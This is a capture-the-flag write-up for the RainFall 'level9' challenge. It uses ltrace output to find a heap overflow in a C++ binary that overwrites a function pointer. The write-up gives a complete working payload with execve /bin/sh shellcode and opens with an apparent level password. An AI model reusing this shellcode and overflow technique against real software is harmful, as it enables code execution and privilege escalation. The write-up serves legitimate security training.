level9:c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

# Reconnaissance

C++ code
expects an argument

```shell
level9@RainFall:~$ ltrace ./level9 AAAA
__libc_start_main(0x80485f4, 2, 0xbffff7f4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)                                        = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                                                     = 0
_Znwj(108, 0xbffff7f4, 0xbffff800, 0xb7d79e55, 0xb7fed280)                                                                = 0x804a008
_Znwj(108, 5, 0xbffff800, 0xb7d79e55, 0xb7fed280)                                                                         = 0x804a078
strlen("AAAA")                                                                                                            = 4
memcpy(0x0804a00c, "AAAA", 4)                                                                                             = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c)                                                   = 0xb7fce4a0
+++ exited (status 11) +++
```

With ltrace, we notice that the function copies the entire first argument at `0x0804a00c`

We notice that we have an offset 108, we have to insert an address which point a shellcode
The overflow happends on the second object, on a function pointer attribute.

# Exploit

We have to overwrite the function pointer with an address to our shellcode, lets just point to the beginning of the buffer
where our argument is copied. Our argument must start with the address to the beginning of our shellcode, which is 4 bytes after.

payload => (`0x0804a00c` + 0x4) + (shellcode 26 bytes long) + padding + `0x0804a00c`
108 - (4 + 26) = 108 - 30 = 78 paddings bytes

payload = `$(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\x6a\x0b\x58\xcd\x80" + "A" * 78 + "\x0c\xa0\04\x08"')`
